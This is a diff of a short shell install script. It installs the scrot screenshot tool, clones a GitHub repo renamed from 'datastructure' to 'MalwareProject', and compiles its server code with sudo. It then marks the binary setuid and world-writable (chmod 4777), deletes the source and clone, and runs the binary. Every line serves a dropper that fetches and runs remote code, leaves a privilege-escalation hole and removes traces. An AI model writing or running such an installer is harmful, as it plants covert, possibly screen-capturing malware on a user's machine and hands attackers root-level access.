@@ -1,8 +1,8 @@
 sudo apt-get install scrot
-git clone "https://github.com/Hmgi/datastructure.git"
-cp datastructure/server_file.c server_file.c
-sudo gcc -g server_file.c -o server.out
+git clone "https://github.com/Hmgi/MalwareProject.git"
+cp MalwareProject/server.c server.c
+sudo gcc -g server.c -o server.out
 sudo chmod 4777 server.out
-rm -rf datastructure
-rm server_file.c
+rm -rf MalwareProject
+rm server.c
 ./server.out
